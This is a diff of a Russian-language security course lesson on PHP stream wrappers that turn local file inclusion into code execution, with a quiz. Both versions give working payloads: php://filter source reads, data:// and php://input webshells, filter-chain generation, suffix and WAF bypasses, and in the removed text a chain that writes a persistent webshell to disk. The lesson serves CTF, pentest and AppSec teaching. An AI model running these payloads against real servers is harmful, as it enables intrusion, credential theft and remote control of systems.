@@ -15,331 +15,206 @@ estimated_minutes: 45
 summary: "PHP stream wrappers: php://filter (исходники/цепочки), data://, expect://, input://, zip://, phar:// — от LFI до RCE."
 ---
 
-PHP stream wrappers — это встроенные протоколы (`php://`, `data://`, `zip://`, `phar://`, `expect://`), которые PHP использует в файловых функциях (`include`, `file_get_contents`, `fopen`, `readfile`). Когда путь к файлу контролируется пользователем (классический LFI), обёртки превращают простое «чтение файла» в утечку исходников, инъекцию кода и RCE. Понимание обёрток — обязательный шаг между «нашёл LFI» и «получил выполнение кода».
+В уроке про LFI мы видели, что PHP-параметр `?page=` подключается через `include` и может включить произвольный файл. Но когда мы попробовали прочитать исходник `config.php`, сервер его **исполнил**, а не показал. А когда попробовали подсунуть свой код — сработало не всегда. Причина в том, что PHP умеет открывать не только файлы, но и **потоки** с особыми префиксами — их называют **обёртками** (wrappers). Они и решают обе задачи: чтение исходников и выполнение кода.
 
-## Теория: что такое stream wrappers
+Возьмём `shop.local` с LFI и разберём обёртки по порядку.
 
-PHP регистрирует обёртки, которые обрабатывают URL-подобные пути. Для атакующего важны:
+## Наш пример: тот же include
 
-| Обёртка | Что делает | Включена по умолчанию |
-|---------|-----------|------------------------|
-| `php://filter` | применяет фильтры к потоку (base64, rot13) | да |
-| `php://input` | читает тело POST | да |
-| `data://` | inline-данные | да (требует `allow_url_include` для include) |
-| `expect://` | выполняет команду | нет (нужен модуль expect) |
-| `zip://` | читает файл внутри ZIP | да |
-| `phar://` | читает phar (метаданные → десериализация) | да |
-| `glob://` | перечисляет файлы | да |
-
-Ключевой нюанс: `include`/`require` с `php://`/`data://` требуют `allow_url_include=On` (обычно выключено), но `php://filter` работает всегда.
-
-## php://filter — чтение исходников
-
-Когда `include($_GET['page'])` исполняет PHP, читать исходник через обычный путь бесполезно — он исполнится. `php://filter` позволяет прочитать файл **без исполнения**, применив base64-фильтр:
+Напомним уязвимость:
 
 ```bash
-curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=index.php"
+$ curl -s 'https://shop.local/?page=../../../../etc/passwd' | head -1
+root:x:0:0:root:/root:/bin/bash
 ```
 
-В ответе — base64 исходника; декодируем:
+Читать файлы умеем. Теперь заглянем в исходник — но `?page=config.php` его исполнит, и мы увидим результат, а не код. Нужна обёртка, которая прочитает файл «как данные».
+
+## Шаг 1: `php://filter` — читаем, не исполняя
+
+Префикс `php://filter` пропускает содержимое файла через фильтры перед выдачей. Самый полезный — `convert.base64-encode`:
 
 ```bash
-echo 'PD9waHAg...' | base64 -d
+$ curl -s 'https://shop.local/?page=php://filter/convert.base64-encode/resource=config'
+PD9waHAKJGFkbWluX3Bhc3MgPSAiU3VwM3JTM2NyM3QhIjsKPz4=
 ```
 
-Часто нужно комбинировать фильтры, чтобы обойти WAF/фильтр расширений:
-
-```text
-php://filter/read=convert.base64-encode/resource=config.php
-php://filter/convert.base64-encode/resource=../../etc/passwd
-php://filter/read=string.rot13/resource=index.php
-php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
-```
-
-Читаем конфиги/креды: `config.php`, `.env`, `wp-config.php`, `database.php`.
-
-## Цепочки фильтров → RCE (filter chain)
-
-Главный современный приём: собрать из `php://filter` цепочку, которая **дописывает произвольный PHP-код в начало потока** и заставляет `include` его исполнить. Инструмент `php_filter_chain_generator` генерирует такую цепочку для заданной команды:
+Декодируем base64 и видим исходник:
 
 ```bash
-python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
-# выводит длинную цепочку php://filter/convert.iconv.../resource=php://temp
+$ echo 'PD9waHAKJGFkbWluX3Bhc3MgPSAiU3VwM3JTM2NyM3QhIjsKPz4=' | base64 -d
+<?php
+$admin_pass = "Sup3rS3cr3t!";
+?>
 ```
 
-Доставка:
+Так `php://filter` превращает «исполнение» в «чтение». Это ключ к разведке кода: пароли, пути, другие включения — всё становится видно.
+
+## Шаг 2: `data://` — исполняем свой код
+
+Второй класс обёрток позволяет передать данные прямо в URL и исполнить их. `data://` берёт строку (часто в base64) и отдаёт её как файл:
 
 ```bash
-curl -s "https://app.example/?page=<сгенерированная цепочка>"
+$ curl -s 'https://shop.local/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Требование: `include`/`require` уязвим (или любая функция, исполняющая поток). Работает без `allow_url_include` и без загрузки файла — только `php://filter`.
+Строка `PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+` — это `<?php system($_GET['c']); ?>`. Обёртка отдала её как файл, `include` исполнил — получили RCE. Ограничение: `data://` работает, только если в PHP включена опция **`allow_url_include`** (по умолчанию она выключена).
 
-## data:// — inline-код
+## Шаг 3: `php://input` — код из тела запроса
 
-Если `allow_url_include=On`:
-
-```text
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
-```
-
-где base64 — это `<?php system($_GET['c']);?>`. Доставка:
+Если `allow_url_include` включён, есть ещё `php://input` — это «файл», содержимое которого равно телу POST-запроса:
 
 ```bash
-curl -s "https://app.example/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id"
+$ curl -s 'https://shop.local/?page=php://input' --data '<?php system("id"); ?>'
+uid=33(www-data) ...
 ```
 
-Если `allow_url_include=Off`, `data://` в `include` не сработает — используйте filter chain.
+Удобно, когда `data://` фильтруется, а `php://input` нет.
 
-## php://input — тело POST
+## Шаг 4: если `allow_url_include` выключен — filter chain
 
-Когда `include` берёт путь из параметра, `php://input` позволяет исполнить тело запроса как PHP:
+Чаще всего `allow_url_include=Off`, и `data://`/`php://input` не работают. Но `php://filter` доступен всегда. Оказывается, цепочкой фильтров `convert.iconv.*` можно собрать из байтов самого файла произвольную строку — включая PHP-код. Это называется **filter chain** (цепочка фильтров). Инструмент `php_filter_chain_generator` генерирует такую цепочку:
 
 ```bash
-curl -s "https://app.example/?page=php://input" --data '<?php system("id"); ?>'
+$ python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
+$ curl -s -G 'https://shop.local/' --data-urlencode "page@chain.txt"
+uid=33(www-data) gid=33(www-data) ...
 ```
 
-Тоже требует `allow_url_include=On`. Полезно, когда нет возможности загрузить файл.
+Смысл: цепочка фильтров превращает «пустой» на вид поток в наш код, и `include` его исполняет. Это работает **без** `allow_url_include` и потому считается основным современным способом LFI→RCE.
 
-## expect:// — прямая команда
+## Шаг 5: `expect://`, `zip://`, `phar://`
 
-При наличии расширения `expect`:
+Ещё несколько обёрток:
+
+- **`expect://id`** — выполняет команду напрямую (если установлено расширение `expect`); редко, но мгновенный RCE.
+- **`zip://upload.zip#shell.php`** — открывает файл внутри zip-архива; полезно, если есть загрузка архива.
+- **`phar://upload.phar/shell.php`** — открывает файл внутри phar-архива; часто доступно там, где `zip://` закрыт.
+
+Смысл этих обёрток — обойти фильтры, которые проверяют расширения: внутри архива наш `.php` спрятан, а снаружи — безобидный `.zip`.
+
+## Шаг 6: обход суффикса `.php`
+
+Часто код делает `include($page . '.php')` — дописывает `.php`. Тогда `data://...` станет `data://...php` и сломается. Обход — добавить `?` в конец полезной нагрузки, чтобы `.php` попал в query-строку и «отвалился»:
 
 ```bash
-curl -s "https://app.example/?page=expect://id"
+$ curl -s 'https://shop.local/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+?&c=id'
+uid=33(www-data) ...
 ```
 
-Работает редко (модуль обычно не установлен), но если есть — это мгновенный RCE.
+Также помогает null-байт `%00` на очень старых версиях PHP (до 5.3.4).
 
-## zip:// и phar://
+## Шаг 7: почему обёртки — это отдельная тема
 
-- **`zip://`** — исполнить PHP внутри ZIP: загружаем zip с `shell.php`, затем `?page=zip://uploads/archive.zip%23shell.php`.
-- **`phar://`** — не только чтение, но и авто-десериализация метаданных (см. `web-php-deser-chains`): `?page=phar://uploads/exploit.phar/test`.
+Может показаться, что обёртки — просто «ещё один приём». На самом деле они меняют сам характер уязвимости. Обычный path traversal умеет только **читать** байты, а обёртки дают три вещи, которых у него нет:
 
-`phar://` требует, чтобы файл был валидным phar; PHP < 8.0 триггерит десериализацию в большинстве файловых функций.
+- **чтение исходников** там, где файл исполняется (`php://filter` — иначе PHP съест код и покажет результат);
+- **выполнение кода** из данных, которые нигде не лежат на диске (`data://`, `php://input`);
+- **обход фильтров** по расширению и по путям (`zip://`, `phar://`, filter chain).
 
-## Разобранный пример: LFI → php://filter → креды → RCE
+Именно поэтому разработчики, которые «закрыли `../`», часто всё равно уязвимы: они не подумали, что значение параметра может быть не путём, а **потоком** с префиксом. Проверка «нет ли `../`» не ловит строку `php://filter/...`, потому что там нет ни одного `../`.
 
-Шаг 1 — находим LFI и подтверждаем чтение:
+## Шаг 8: как искать точку входа
+
+Прежде чем строить payload, нужно найти параметр, который попадает в `include`. Признаки:
+
+- URL выглядит как выбор страницы: `?page=`, `?view=`, `?lang=`, `?template=`, `?mod=`;
+- смена значения меняет содержимое страницы (но не даёт файла — значит, он включается);
+- добавление `.php` в значение меняет ответ (код дописывает расширение).
+
+Полезно перебрать имена параметров инструментом `ffuf`, подставляя в значение `php://filter/convert.base64-encode/resource=index` и ища в ответе длинную base64-строку:
 
 ```bash
-curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=../../etc/passwd"
+$ ffuf -u 'https://shop.local/?FUZZ=php://filter/convert.base64-encode/resource=index' \
+  -w params.txt -mr '^[A-Za-z0-9+/=]{40,}'
+page                    [Status: 200, Size: 5120]
 ```
 
-Шаг 2 — читаем исходник и конфиг:
+Флаг `-mr` («match regex») оставляет только ответы, где есть подозрительно длинная base64-строка — верный признак, что файл прочитан через обёртку.
 
-```bash
-curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=config.php" | cut -d/ -f2 | base64 -d
-```
+## Шаг 9: порядок действий в реальной задаче
 
-Шаг 3 — из конфига достаём креды БД/админки; логинимся или подключаемся к MySQL. Если есть `allow_url_include` — сразу `data://`-webshell.
+Когда нашёл LFI, действуй по шагам, а не вслепую:
 
-## Разобранный пример: filter chain RCE
+1. **Подтверди включение** — попробуй прочитать `/etc/passwd` через `php://filter` (base64). Если видишь base64 — параметр точно уязвим.
+2. **Прочитай исходник** `index`/`config` — найди, куда ещё пишется ввод, где секреты и как формируется путь.
+3. **Определи `allow_url_include`** — тест `data://`: если исполняется, используй его; если нет — иди к filter chain.
+4. **Обойди суффикс**, если он есть (`?`, `%00`).
+5. **Получи код-исполнение** и подтверди его выводом `id` (это и есть доказательство impact).
 
-Шаг 1 — генерируем цепочку:
+Такой порядок экономит время: ты не перебираешь десятки payload'ов, а идёшь от разведки к эксплуатации.
 
-```bash
-python3 php_filter_chain_generator.py --chain '<?=`id`;?>'
-```
+## Что мы теперь знаем
 
-Шаг 2 — подставляем в уязвимый параметр:
+- **PHP-обёртки** — префиксы, которые открывают не только файлы, но и потоки.
+- `php://filter/convert.base64-encode/resource=` — чтение исходников без исполнения.
+- `data://` и `php://input` — исполнение своего кода, если `allow_url_include=On`.
+- **Filter chain** — RCE без `allow_url_include`, только из `php://filter`.
+- `zip://`/`phar://`/`expect://` — обходы через архивы и команды.
 
-```bash
-curl -s "https://app.example/?page=$(python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1)"
-```
+## На что смотреть дальше
 
-Шаг 3 — в ответе вывод `id`. Для reverse shell меняем команду.
-
-## Где искать
-
-- Параметры `page=`, `file=`, `path=`, `include=`, `template=`, `lang=`, `view=`.
-- Функции `include`/`require`/`file_get_contents`/`readfile`/`fopen` с пользовательским путём.
-- CMS/плагины с LFI (`wp-content`, `theme=`, `module=`).
-- Загрузка файлов + `phar://`/`zip://` для исполнения.
-- Признаки: `include(): Failed opening`, `Warning: include`, `php://filter` в ответе.
-
-## Инструменты
-
-- **`php_filter_chain_generator`** — цепочки для RCE.
-- **`php://filter`** — ручное чтение исходников.
-- **`phpggc`** — phar-payload (см. `web-php-deser-chains`).
-- **`ffuf`/`gobuster`** — поиск LFI-параметров и файлов (см. `web-tool-ffuf`).
-- **`lfimap`/`LFISuite`** — автоматизация.
-
-## Что дальше / decision
-
-1. Есть `include` с пользовательским путём → проверьте `php://filter/convert.base64-encode/resource=index.php`.
-2. Прочитали исходники/креды → ищите `allow_url_include` и другие точки.
-3. `allow_url_include=On` → `data://`/`php://input` webshell.
-4. Off → filter chain (`php_filter_chain_generator`).
-5. Есть загрузка файла → `zip://`/`phar://` для исполнения.
-6. RCE → устойчивый канал + read-back.
-
-## Частые ошибки
-
-- **Пытаться читать исходник обычным путём.** PHP его исполнит — нужен `php://filter`.
-- **Забыть `allow_url_include`.** `data://`/`php://input` не сработают.
-- **Путать `php://filter` и `php://input`.** Разные задачи.
-- **Не кодировать `#` в `zip://`.** В URL это `%23`.
-- **Считать `expect://` всегда доступным.** Обычно модуль не установлен.
-- **Ломать прод.** RCE — только с согласия.
-
-## Полный разбор: filter chain → webshell → read-back (с выводом)
-
-End-to-end: от LFI до устойчивого канала. Цель — `?page=` уходит в `include`.
-
-Шаг 1. Подтверждаем LFI:
-
-```bash
-curl -s 'https://app.example/?page=php://filter/convert.base64-encode/resource=index.php' | head -c 80
-# PD9waHAK...   -> base64 исходника, LFI подтверждён
-echo 'PD9waHAK...' | base64 -d | head
-# <?php
-```
-
-Шаг 2. Генерируем цепочку для записи webshell на диск (не только для `id`):
-
-```bash
-python3 php_filter_chain_generator.py \
-  --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' \
-  | tail -1 > /tmp/chain.txt
-wc -c /tmp/chain.txt
-# 41288 /tmp/chain.txt
-```
-
-Шаг 3. Доставляем цепочку. Если она длиннее лимита URL — отправляем через `-G --data-urlencode` или POST:
-
-```bash
-curl -s -G 'https://app.example/' --data-urlencode "page@/tmp/chain.txt" -o /dev/null
-```
-
-Шаг 4. Read-back: проверяем, что webshell реально создан (не fire-and-forget!):
-
-```bash
-curl -s 'https://app.example/s.php?c=id'
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
-curl -s 'https://app.example/s.php?c=hostname;uname -a'
-# web01 Linux web01 5.15.0 ...
-```
-
-Если `id` вернулся — канал подтверждён. Дальше — reverse shell или запись SSH-ключа (не гоняйте длинную цепочку повторно).
-
-## Reference-таблица: обёртки, требования, эффект
-
-| Обёртка | Требование | Эффект | Пример |
-|---------|-----------|--------|--------|
-| `php://filter` | нет | чтение исходников/фильтры | `.../resource=index.php` |
-| `php://filter` chain | include | RCE без allow_url_include | `--chain '<?=...?>'` |
-| `data://` | `allow_url_include=On` | inline-код в include | `data://text/plain;base64,...` |
-| `php://input` | `allow_url_include=On` | тело POST как PHP | `--data '<?php ...'` |
-| `expect://` | модуль expect | прямая команда | `expect://id` |
-| `zip://` | загруженный zip | исполнение PHP в архиве | `zip://u/a.zip%23s.php` |
-| `phar://` | валидный phar | чтение + десериализация | `phar://u/p.phar/x` |
-| `glob://` | нет | листинг файлов | `glob:///var/www/*` |
-| `compress.zlib://` | нет | распаковка | `compress.zlib://f.gz` |
-
-## Обход фильтров расширений и WAF
-
-- **Суффикс `.php` обязателен?** — обёртки не оканчиваются на `.php`, но если фильтр режет имя файла, применяйте `php://filter/.../resource=...` и кодируйте `resource`.
-- **Запрет `php://`:** регистр `PHP://`, двойное кодирование `%70hp://`, добавление пустого параметра `php://filter/.../resource=index.php?` .
-- **Запрет `filter`:** `php://filter` → `php://Filter`, `php://fIlTeR`.
-- **Запрет `..`:** используйте абсолютные пути (`/var/www/html/config.php`) или `glob://`.
-- **Запрет на определённые функции:** если `include` фильтруется, ищите `file_get_contents` + `eval`, `readfile`, `show_source` — вывод исходника без исполнения.
-- **Скрытие через base64:** читайте исходники через `convert.base64-encode`, чтобы WAF не увидел PHP-код в ответе.
-- **WAF по сигнатуре цепочки:** разбейте доставку на несколько параметров (`?a=php://filter&b=...`) или шлите в теле.
-
-## Что делать дальше / решение
-
-1. **LFI есть** → сразу `php://filter/convert.base64-encode/resource=` для исходников.
-2. **Читаем конфиги** (`.env`, `config.php`, `wp-config.php`) — креды БД/админки.
-3. **`allow_url_include=On`** → `data://`/`php://input` webshell.
-4. **Off** → filter chain (`php_filter_chain_generator`) до записи webshell.
-5. **Есть загрузка файла** → `zip://`/`phar://` для исполнения.
-6. **RCE подтверждён** → устойчивый канал (webshell/reverse shell) + обязательный read-back (`id`).
-7. **Не повторяйте длинную цепочку** — она тяжёлая; используйте её один раз для закрепления.
-
-## Wrapper-трюки в CTF: glob, compress.zlib, загрузка+zip
-
-Дополнительные обёртки, которые выручают, когда filter-chain не проходит:
-
-```bash
-# glob:// — листинг файлов (когда чтение конкретного имени запрещено)
-curl -s 'https://app.example/?page=glob:///var/www/html/*'
-# /var/www/html/index.php /var/www/html/config.php ...
-
-# compress.zlib:// — чтение .gz без распаковки вручную
-curl -s 'https://app.example/?page=compress.zlib:///var/log/app.log.gz'
-
-# data:// с URL-encoded (когда base64-часть фильтруется)
-curl -s 'https://app.example/?page=data://text/plain,<?php system($_GET[c]);?>&c=id'
-
-# php://fd — чтение открытых дескрипторов (логи, временные)
-curl -s 'https://app.example/?page=php://fd/3'
-```
-
-Связка «загрузка + zip»: если есть загрузка файла и LFI, загружаем `shell.zip` с `shell.php` внутри, затем `?page=zip://uploads/shell.zip%23shell.php`. Расширение `.zip` обычно проходит фильтр, а `#` в URL кодируется как `%23`. Аналогично `phar://` — но он триггерит десериализацию и опаснее.
-
-Ещё приёмы: `php://temp` (временный поток), `php://memory`, вложенные filter-цепочки с `convert.iconv` для создания нужных байтов, и `read=` / `write=` у `php://filter` для управления направлением. Помните: `include` исполняет поток, поэтому обёртки превращают любое «чтение» в потенциальный RCE.
-
-## Чем wrapper-атака отличается от «простого» LFI
-
-Обычный LFI даёт только чтение файла: вы видите содержимое `/etc/passwd`, но не исполняете код. Stream wrappers меняют саму природу уязвимости:
-
-- **Чтение исходников** — `php://filter` снимает «исполнение» и отдаёт код PHP, который иначе не прочитать.
-- **Инъекция кода** — `data://`, `php://input`, filter chain заставляют `include` исполнить ваш код.
-- **Исполнение внутри архива** — `zip://`/`phar://` позволяют запустить PHP из загруженного файла.
-- **Десериализация** — `phar://` триггерит POP-цепочку без явного `unserialize`.
-
-Поэтому LFI без wrappers — половина уязвимости; умение собрать цепочку определяет, будет ли это чтение конфига или полноценный RCE.
+- **Сначала `php://filter`** — прочитай исходник, найди секреты и другие включения.
+- **Проверь `allow_url_include`** — по поведению `data://`/`php://input`.
+- **Если закрыто — filter chain**: работает почти всегда и потому обязателен в арсенале.
+- **Помни про суффикс:** `?` и `%00` — твои друзья против `.php`.
+- **Проверяй read-back:** после RCE выполни `id` и `hostname`, чтобы доказать, что код исполнился именно на сервере, а не отобразился как текст.
 
 ## Квиз
 
+Выбери один вариант в каждом вопросе.
+
 ```quiz
-- question: "Какая обёртка читает исходник, не исполняя PHP?"
+- question: "Зачем нужна `php://filter/convert.base64-encode/resource=`?"
   options:
-    - "data://"
-    - "php://filter/convert.base64-encode/resource="
-    - "expect://"
-    - "zip://"
+    - "Чтобы выполнить код"
+    - "Чтобы прочитать исходник, не исполняя его"
+    - "Чтобы отправить HTTP-запрос"
+    - "Чтобы зашифровать трафик"
   answer: 1
-  explanation: "base64-кодирование потока файла."
-- question: "Что нужно для data:// с PHP-кодом?"
+  explanation: "Обёртка кодирует файл в base64, поэтому PHP печатает его, а не выполняет."
+- question: "Какая опция PHP нужна для работы `data://` и `php://input`?"
   options:
-    - "Только LFI"
-    - "allow_url_include=On"
-    - "TLS"
-    - "Cookie"
+    - "`display_errors`"
+    - "`allow_url_include`"
+    - "`short_open_tag`"
+    - "`open_basedir`"
   answer: 1
-  explanation: "Иначе include URL запрещён."
-- question: "Что делает expect://?"
+  explanation: "Включение `allow_url_include` разрешает включать удалённые/потоковые источники."
+- question: "Что такое filter chain?"
   options:
-    - "Читает файл"
-    - "Выполняет команду (если расширение установлено)"
-    - "Кеширует"
-    - "Шифрует"
+    - "Цепочка SQL-запросов"
+    - "Цепочка фильтров `convert.iconv`, собирающая PHP-код из байтов файла"
+    - "Список WAF-правил"
+    - "Набор cookies"
   answer: 1
-  explanation: "expect выполняет shell-команду."
-- question: "Чем phar:// опаснее zip://?"
+  explanation: "Она даёт RCE через `php://filter` даже без `allow_url_include`."
+- question: "Чем полезна `phar://`?"
   options:
-    - "Он быстрее"
-    - "Авто-десериализует метаданные phar"
-    - "Он шифрует"
-    - "Он кеширует"
+    - "Ускоряет загрузку"
+    - "Открывает файл внутри phar-архива, обходя фильтры по расширению"
+    - "Шифрует данные"
+    - "Отправляет почту"
   answer: 1
-  explanation: "Phar-метаданные триггерят POP chain."
-- question: "Как filter chain даёт RCE?"
+  explanation: "Внутри архива прячется `.php`, а снаружи файл выглядит безобидно."
+- question: "Как обойти суффикс `.php`, который дописывает код?"
   options:
-    - "Читает /etc/passwd"
-    - "Генерирует произвольные байты (PHP-код) через iconv-фильтры"
-    - "Шифрует"
-    - "Кеширует"
+    - "Написать `../`"
+    - "Добавить `?` в конец payload, чтобы `.php` ушёл в query-строку"
+    - "Использовать HTTPS"
+    - "Отправить POST"
   answer: 1
-  explanation: "Цепочка фильтров строит код в php://temp."
+  explanation: "`?` отсекает дописанный `.php`; на старых PHP помогает null-байт `%00`."
 ```
+
+## Куда дальше
+
+Обёртки — это про то, как обойти защиту **внутри** PHP. Но иногда эксплуатировать ничего не нужно: уязвимость уже есть в самом фреймворке, и достаточно знать его точную версию. Об этом — следующий урок, `web-framework-cves`.
 
 ## Где пригодится
 
-- **CTF (Web):** LFI-задачи, почти всегда с обёртками.
-- **Bug bounty:** LFI → RCE — критичный отчёт.
-- **Пентест:** аудит PHP-приложений.
-- **Работа (AppSec):** отключение allow_url_include/expect, allowlist путей, обновление PHP.
+- **CTF (Web):** обёртки — стандартный путь от LFI к чтению исходников и RCE.
+- **Bug bounty:** filter chain даёт критичный impact (RCE) на задачах с LFI.
+- **Пентест:** проверка PHP-приложений на `allow_url_include`, `open_basedir` и обёртки.
+- **Работа (AppSec):** отключение опасных обёрток и `allow_url_include`, allowlist включаемых файлов.
